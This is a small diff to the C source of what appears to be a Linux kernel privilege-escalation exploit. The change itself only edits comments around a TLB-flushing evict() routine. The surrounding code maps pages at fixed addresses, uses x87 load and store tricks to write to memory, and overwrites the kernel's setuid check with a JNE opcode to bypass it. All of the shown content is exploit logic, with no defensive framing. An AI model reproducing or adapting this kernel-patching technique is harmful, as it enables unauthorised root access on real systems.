@@ -364,6 +364,7 @@ typedef struct __attribute__((__packed__)) float_struct {
 } float_struct_t;
 
 
+// TLB flush
 void evict(){
     for(int i = 0; i < 0x100; ++i){
         void *p = mmap((void*)(0x40000000000 + i*PAGE_SIZE), PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
@@ -463,7 +464,6 @@ int main(){
     fld_from_addr(fs);
     fstp_to_addr(unmovable+0xffe);
     
-    // quick TLB flush (works only if KPTI is on)
     evict();
 
     ((unsigned char *)corrupted)[KERNEL_SETUID_CHECK & (PAGE_SIZE-1)] = JNE_OPCODE;
